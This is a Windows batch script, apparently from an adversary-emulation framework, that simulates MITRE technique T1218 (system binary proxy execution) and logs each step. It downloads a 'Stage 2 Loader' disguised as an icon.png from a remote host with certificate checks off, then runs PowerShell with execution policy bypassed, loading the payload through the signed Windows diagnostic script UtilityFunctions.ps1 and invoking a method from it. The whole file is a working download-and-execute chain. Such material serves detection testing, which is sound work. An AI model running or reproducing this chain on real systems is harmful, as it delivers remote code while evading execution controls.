@echo off
setlocal enabledelayedexpansion

REM SET-var preamble: declare random-named SET vars for non-path PHR placeholders
REM Path-related placeholders (OUTPUT_DIR, OUTPUT_FILE, ENDPOINT_ID) are used as {PHR_*} literals for patcher substitution.
SET a1b2c3=ITZEL-S2B
SET d4e5f6=10312
SET p6q7r8=https://10.0.0.49/stage/2/icon.png?10312-7
SET y5z6a7=Microsoft.Win32.TaskScheduler.NativeBridge
SET b8c9d0=Dale
REM Unused placeholders (reserved for future use)
SET s9t0u1=%APPDATA%\7\macula-simulations.log
SET v2w3x4=%APPDATA%\7
SET e1f2g3=https://10.0.0.49

REM Timestamp helper
for /f "tokens=1-6 delims=/:. " %%a in ("%date% %time%") do set tsvar=%%a-%%b-%%c_%%d:%%e:%%f

REM Heartbeat fetch (downloads Stage 2 Loader)
echo [!tsvar!][DEBUG][!a1b2c3!][!d4e5f6!]: heartbeat_start >> "%APPDATA%\7\macula-simulations.log" 2>nul
curl -k -s -o "%APPDATA%\10312\978855ad\efdda6e9.txt" "!p6q7r8!"
echo [!tsvar!][DEBUG][!a1b2c3!][!d4e5f6!]: heartbeat_complete >> "%APPDATA%\7\macula-simulations.log" 2>nul

REM Change directory to output location
cd /d "%APPDATA%\10312\978855ad"
echo [!tsvar!][DEBUG][!a1b2c3!][!d4e5f6!]: chdir_result=!errorlevel! >> "%APPDATA%\7\macula-simulations.log" 2>nul

REM LOLBIN invocation (PowerShell proxy execution)
echo [!tsvar!][DEBUG][!a1b2c3!][!d4e5f6!]: lolbin_start >> "%APPDATA%\7\macula-simulations.log" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin %APPDATA%\10312\978855ad\\efdda6e9.txt;[Microsoft.Win32.TaskScheduler.NativeBridge]::Dale()"
set LOLBIN_EXIT=!errorlevel!

REM TTP completion log: T1218 System Binary Proxy Execution
if !LOLBIN_EXIT! equ 0 (
    echo [!tsvar!][TTP][!a1b2c3!][!d4e5f6!]: T1218^|System Binary Proxy Execution=[OK]:[] >> "%APPDATA%\7\macula-simulations.log" 2>nul
) else (
    echo [!tsvar!][TTP][!a1b2c3!][!d4e5f6!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed] >> "%APPDATA%\7\macula-simulations.log" 2>nul
)

endlocal